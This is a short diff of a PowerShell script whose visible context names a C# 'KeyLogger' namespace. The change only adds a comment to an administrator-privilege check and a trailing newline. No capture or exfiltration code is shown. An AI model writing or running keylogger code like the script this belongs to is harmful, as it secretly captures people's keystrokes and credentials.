@@ -50,7 +50,7 @@ namespace KeyLogger {
   }
 }
 ' -ReferencedAssemblies System.Windows.Forms
-if (-not [bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")) {
+if (-not [bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")) {	# checks if the script is running as admin
 	exit
 }
 
@@ -85,3 +85,4 @@ while ($true) {
     }
 
 }
+
